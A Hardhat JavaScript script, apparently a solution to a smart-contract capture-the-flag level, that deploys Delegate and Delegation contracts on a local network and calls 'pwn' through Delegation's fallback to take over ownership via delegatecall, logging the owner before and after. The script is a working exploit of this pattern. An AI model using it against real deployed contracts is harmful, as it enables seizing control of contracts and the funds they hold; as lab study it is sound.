const { getCreate2Address } = require("@ethersproject/address");
const hre = require("hardhat");

async function main() {
    const [first, second, third] = (await hre.ethers.getSigners());

    const Delegate = await hre.ethers.getContractFactory("Delegate");
    const delegate = await Delegate.deploy(first.address);
    await delegate.deployed();

    const Delegation = await hre.ethers.getContractFactory("Delegation");
    const delegation = await Delegation.deploy(delegate.address);
    await delegation.deployed();

    const oldOwner =await delegate.owner();
    console.log("oldOwner",oldOwner)



    //const abi =[{"inputs":[{"internalType":"address","name":"_delegateAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"stateMutability":"nonpayable","type":"fallback"},{"inputs":[],"name":"foo","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}];
    const abi = [{ "inputs": [{ "internalType": "address", "name": "_owner", "type": "address" }], "stateMutability": "nonpayable", "type": "constructor" }, { "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "pwn", "outputs": [], "stateMutability": "nonpayable", "type": "function" }]
    const iface = new hre.ethers.utils.Interface(abi)


    const encoded = iface.encodeFunctionData("pwn");

    console.log(encoded);
    await second.sendTransaction({

        to: delegation.address,
        data: encoded,

    })

    const newOwner =await delegate.owner();

    console.log("newOwner",newOwner)
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
